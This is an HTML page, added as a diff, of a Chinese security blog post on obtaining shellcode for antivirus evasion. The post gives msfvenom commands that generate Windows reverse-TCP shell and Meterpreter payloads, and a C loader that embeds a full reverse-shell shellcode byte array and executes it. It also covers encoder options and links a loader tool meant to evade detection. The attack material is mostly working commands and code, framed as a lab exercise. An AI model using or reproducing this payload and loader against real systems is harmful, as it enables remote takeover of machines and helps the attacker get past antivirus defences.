@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言shellcode的入门使用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ShellCode获取">
+<meta property="og:url" content="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/index.html">
+<meta property="og:site_name" content="Scammer">
+<meta property="og:description" content="前言shellcode的入门使用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/simg/shellcode_1.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_2.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_3.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_4.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_5.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_7.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_8.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_9.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_10.png">
+<meta property="og:image" content="http://example.com/simg/shellcode_11.png">
+<meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-01T06:01:34.872Z">
+<meta property="article:author" content="Bron">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/simg/shellcode_1.png">
+
+<link rel="canonical" href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <title>ShellCode获取 | Scammer</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Scammer</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">56</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">73</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">181</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ShellCode获取
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-01 00:00:00 / 修改时间：14:01:34" itemprop="dateCreated datePublished" datetime="2023-09-01T00:00:00+08:00">2023-09-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index"><span itemprop="name">免杀</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shellcode的入门使用。</p>
+<span id="more"></span>
+<h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p>
+<p>shellcode可以按照攻击者控制是否在目标机器上执行载荷分为本地shellcode和远程shellcode。本地运行的shellcode经常用于在攻击者对计算机的访问权限有限，需要利用软件漏洞提升权限；远程shellcode常用于攻击者以运行在某个网络中的另一台机器上的易受攻击的进程为目标时，如果成功执行，shellcode可以通过网络访问目标主机。</p>
+<h1 id="直接获取shellcode"><a href="#直接获取shellcode" class="headerlink" title="直接获取shellcode"></a>直接获取shellcode</h1><p>网络上有许多已经编写好的shellcode资源公开分享，由于shellcode的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是一个可以学习的网站。<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database</a><br>但来自网络的资源很有可能由于久久未更新、适用的系统已经被淘汰，或者是shellcode已经被公开而变得容易被查杀，这时候我们就需要能够即时获取shellcode的方法。</p>
+<h1 id="通过软件获取shellcode"><a href="#通过软件获取shellcode" class="headerlink" title="通过软件获取shellcode"></a>通过软件获取shellcode</h1><h2 id="CobaltStrike-Ver-4-0"><a href="#CobaltStrike-Ver-4-0" class="headerlink" title="CobaltStrike(Ver 4.0)"></a>CobaltStrike(Ver 4.0)</h2><p><img src="/simg/shellcode_1.png" alt="cs"><br>勾选生成c语言形式的shellcode，在下拉列表里我们还能看到有许多其他语言形式的shellcode。<br><img src="/simg/shellcode_2.png" alt="cs"><br>接着我们会得到一个文件，其中包含了所需的shellcode，只要将这段shellcode放入预先写好的加载器中就可以使用了：<br><img src="/simg/shellcode_3.png" alt=" "></p>
+<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>MsfVenom 集成了msfpayload 和msfencode的功能，用于生成各种类型的payload</p>
+<ol>
+<li><p>首先查看可用的payload类型，需要Windows平台下的shellcode进行实验，所以使用命令<br><code>msfvenom --list payload |grep windows</code><br>挑选一个反弹shell的payload <code>windows/shell/reverse_tcp</code></p>
+</li>
+<li><p>查看支持的平台架构<br><code>msfvenom -p windows/shell/reverse_tcp --list archs</code><br>选择x64平台<br>实际测试中，要根据payload选择对应的平台，否则会提示Error: The selected arch is incompatible with the payload。<br>除此之外，本次测试中生成x64架构的shellcode并不能直接用c语言加载，可能是由于测试使用的gcc编译器是32位的。选择x86架构正常加载。</p>
+</li>
+<li><p>查看可用的payload格式<br><code>msfvenom -p windows/shell/reverse_tcp -a x64 --list formats</code><br>选择c语言格式的payload</p>
+</li>
+<li><p>使用–list-options查看payload需要配置的参数<br><code>msfvenom -p windows/shell/reverse_tcp --list-options</code></p>
+</li>
+<li><p>生成payload<br><code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.1 LPORT=2333 -a x86 -f c</code><br><img src="/simg/shellcode_4.png" alt=" "></p>
+</li>
+</ol>
+<p>接下来开始测试生成的shellcode是否可用<br>首先使用msf设置好监听<br><img src="/simg/shellcode_5.png" alt=" "></p>
+<p>将生成的shellcode放入c语言加载器中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x1f\x12\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译执行<br><img src="/simg/shellcode_7.png" alt=" "><br>成功弹回shell</p>
+<p>接下来尝试弹回一个功能更强大的meterpreter<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -a x86 -f c</code></p>
+<p>重新生成shellcode并在加载器中更换<br><img src="/simg/shellcode_8.png" alt=" "></p>
+<h3 id="编码器的使用"><a href="#编码器的使用" class="headerlink" title="编码器的使用"></a>编码器的使用</h3><p>查看可用的编码器<br><code>msfvenom --list encoders</code><br><img src="/simg/shellcode_9.png" alt=" "></p>
+<p>使用-e参数指定一个编码方式，使用-i参数指定编码次数<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -e x86/xor_dynamic -i 5 -a x86 -f c</code><br><img src="/simg/shellcode_10.png" alt=" "><br>生成的shellcode与不加编码器确实有所不同，但是免杀效果几乎没有，不能作为真正的免杀解决方案</p>
+<h3 id="避免使用某些字符"><a href="#避免使用某些字符" class="headerlink" title="避免使用某些字符"></a>避免使用某些字符</h3><p>-b 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中<br>当这个参数被添加的时候，msfvenom 将会自动寻找合适的编码器来编码 Payload<br><img src="/simg/shellcode_11.png" alt=" "></p>
+<h3 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/Axx8/shellcode_loader">ShellCode_Loader</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实战中免杀效果不够。<br>免杀需要不断迭代，杀毒软件也会不断更新，没有永恒的免杀。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a><br><a target="_blank" rel="noopener" href="https://luckyfuture.top/Msfvenom-Gen-ShellCode">使用MSF生成ShellCode</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/" title="ShellCode获取">http://example.com/2023/09/01/ShellCode生成/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="fa fa-tag"></i> 免杀</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="prev" title="免杀基础学习">
+      <i class="fa fa-chevron-left"></i> 免杀基础学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/" rel="next" title="面试准备之语言篇">
+      面试准备之语言篇 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">shellcode简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%8F%96shellcode"><span class="nav-number">3.</span> <span class="nav-text">直接获取shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%BD%AF%E4%BB%B6%E8%8E%B7%E5%8F%96shellcode"><span class="nav-number">4.</span> <span class="nav-text">通过软件获取shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CobaltStrike-Ver-4-0"><span class="nav-number">4.1.</span> <span class="nav-text">CobaltStrike(Ver 4.0)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF"><span class="nav-number">4.2.</span> <span class="nav-text">MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">4.2.1.</span> <span class="nav-text">编码器的使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E6%9F%90%E4%BA%9B%E5%AD%97%E7%AC%A6"><span class="nav-number">4.2.2.</span> <span class="nav-text">避免使用某些字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7"><span class="nav-number">4.2.3.</span> <span class="nav-text">免杀工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">6.</span> <span class="nav-text">致谢</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bron"
+      src="/images/Elaina.png">
+  <p class="site-author-name" itemprop="name">Bron</p>
+  <div class="site-description" itemprop="description">原谅我这一生不羁放纵爱自由</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">181</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">56</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthnian" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthnian" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Elaina_Anime" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Elaina_Anime" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/2CTruth" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;2CTruth" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://truthnian.github.io/" title="https:&#x2F;&#x2F;truthnian.github.io" rel="noopener" target="_blank">世界上最好的网站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Thu Nov 03 2022 08:00:00 GMT+0800 (Singapore Standard Time) – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bron</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">457k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:55</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
